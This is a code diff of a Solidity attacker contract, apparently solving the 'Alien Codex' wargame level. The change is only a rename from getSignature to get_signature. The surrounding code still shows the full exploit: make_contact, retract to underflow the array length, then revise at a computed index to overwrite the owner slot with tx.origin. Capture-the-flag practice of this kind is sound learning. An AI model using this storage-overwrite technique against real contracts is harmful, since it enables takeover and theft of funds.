@@ -8,7 +8,7 @@ contract AlienCodexAttacker {
         codex_alien = _codex_alien;
     }
 
-    function getSignature(
+    function get_signature(
         string memory _signature
     ) public pure returns (bytes4) {
         return bytes4(keccak256(bytes(_signature)));
@@ -43,7 +43,7 @@ contract AlienCodexAttacker {
     function attack() public returns (bool) {
         // call make_contact()
         (bool contactSuccess, ) = codex_alien.call(
-            abi.encodePacked(getSignature("make_contact()"))
+            abi.encodePacked(get_signature("make_contact()"))
         );
         if (!contactSuccess) {
             revert("Error while making contact");
@@ -51,7 +51,7 @@ contract AlienCodexAttacker {
 
         // call retract()
         (bool retractSuccess, ) = codex_alien.call(
-            abi.encodePacked(getSignature("retract()"))
+            abi.encodePacked(get_signature("retract()"))
         );
         if (!retractSuccess) {
             revert("Error while retracting");
@@ -61,7 +61,7 @@ contract AlienCodexAttacker {
         (bool success, ) = codex_alien.call(
             abi.encodePacked(
                 // revise(uint i, bytes32 _content) should be revise(uint256,bytes32)
-                getSignature("revise(uint256,bytes32)"),
+                get_signature("revise(uint256,bytes32)"),
                 get_attack_index(),
                 // bytes32(uint256(uint160(address(tx.origin))))
                 // 0x0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4
